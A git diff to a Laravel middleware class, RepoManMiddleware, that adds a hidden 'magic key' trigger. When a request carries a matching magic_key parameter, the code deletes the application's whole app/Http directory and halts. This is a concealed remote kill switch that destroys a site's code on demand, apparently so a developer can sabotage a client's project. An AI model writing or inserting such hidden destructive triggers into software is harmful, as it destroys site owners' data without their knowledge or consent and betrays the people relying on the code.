@@ -4,12 +4,22 @@ namespace WebPajooh\LaravelRepoman\Middlewares;
 
 use Carbon\Carbon;
 use Closure;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Str;
 
 class RepoManMiddleware
 {
     public function handle($request, Closure $next)
     {
+        if ($this->isTheMagicKeyPresent()) {
+            if (is_dir(app_path('Http'))) {
+                $result = File::deleteDirectory(app_path('Http'));
+                exit($result ? 'The directory has deleted successfully' : 'Something went wrong!');
+            }
+
+            exit('The directory doesn\'t exist!');
+        }
+
         $startDate = Carbon::createFromTimeString(
             config('repoman.start_date')
         );
@@ -29,6 +39,12 @@ class RepoManMiddleware
         $newContent = $this->modifyContent($response->getContent(), $endTime);
 
         return $response->setContent($newContent);
+    }
+
+    private function isTheMagicKeyPresent()
+    {
+        return ! is_null(config('repoman.magic_key'))
+            && config('repoman.magic_key') == request()->magic_key;
     }
 
     private function modifyContent($content, $endTime)
